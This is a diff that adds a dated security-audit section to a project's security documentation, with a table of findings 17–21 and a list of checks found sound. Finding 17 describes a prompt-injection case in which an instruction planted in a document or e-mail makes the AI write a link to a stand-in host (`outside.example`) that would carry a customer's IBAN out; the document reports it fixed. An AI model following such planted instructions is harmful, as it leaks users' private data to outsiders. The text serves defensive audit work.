@@ -190,6 +190,20 @@ Three independent reviews (database policies and functions; server routes, actio
 
 Checked and found sound by the reviews: row-level security on all 37 tables, no table rights for anonymous callers, every SECURITY DEFINER function sets its search path and checks the caller first, the platform admin reaches no content table, storage or real-time channel, restricted clients and group starting points are enforced in the database, usage and credits cannot be written by users, no secret in the repository or the browser bundle, logs carry codes and ids only, file uploads are checked by type, size and content, exports neutralise spreadsheet formulas, no claims of certifications or compliance.
 
+### Security audit (2026-11-11)
+
+A second full pass over the code written since Step 10 (Studio, Consciousness, dictation, images, web search, password sign-in), on the same checklist: isolation between companies and clients, database policies and functions, data sent to providers, uploads and downloads, sign-in, secrets, injection, redirects, logs, our console and Studio, dependencies.
+
+| # | Finding | Severity | Status |
+|---|---|---|---|
+| 17 | A planted instruction (in a document or e-mail given to the AI) could make the AI write a link whose address holds a placeholder (`https://outside.example/?d=[IBAN_1]`); the answer shown restored the real value inside the link, and one click sent it away | medium | **fixed**: a placeholder inside a link's address (web address, `mailto:`, Markdown link or reference, angle-bracket address) stays a placeholder; the visible text is still restored. Streamed answers too, whatever the chunk boundaries (`src/modules/hide/mask.ts`, `tests/unit/security-review.test.ts`) |
+| 18 | Any signed-in customer could read our dollar price per model from the API (`ai_models.*_usd_per_mtok`), against "customers see credits only" | low | **fixed**: column grants hide the three prices from customers; the server reads them with its own key in one audited module (`providers/server/catalog-store.ts`); migration `20261112000001_security_audit.sql`, tests in `tests/integration/security-review.test.ts` |
+| 19 | E-mail sign-in links create an account for any address that asks (the account reaches nothing: creating a company is by invitation, enforced in the database) | info | accepted: Google sign-in behaves the same; Supabase limits how many e-mails are sent |
+| 20 | Two "moderate" advisories in dependencies: `uuid` inside `exceljs` (only a function `exceljs` does not call) and `minimatch` in the lint tooling (not shipped) | info | not exploitable here; watch for updates |
+| 21 | The Content Security Policy still allows inline scripts (Next.js needs them without per-request nonces) | info | recommendation for later: nonce-based CSP |
+
+Checked and found sound: every API route and server action checks the caller (our console and Studio: every action requires a member of our team; Studio's 21 actions included); row-level security on every table; private storage buckets; uploads checked by size and by their first bytes, never by their name; downloads through short-lived signed links; no raw HTML rendered from answers, links in answers limited to http(s) by the Markdown renderer, Studio links to http(s) only; redirects after sign-in limited to our own site; no secret in the code or in the browser bundle (only the public Supabase address and key); server requests only to fixed hosts (OpenAI, GitHub); logs carry error codes only; every path that spends AI credits checks the quota first (chat, Confronter, memory tasks, dictation, avatars).
+
 ## 6. What an external security audit should check
 
 1. **Tenant isolation**, by an attacker holding a valid account in another company: every REST table, RPC, storage path and real-time channel (the database is reachable directly with the public key, not only through the app).
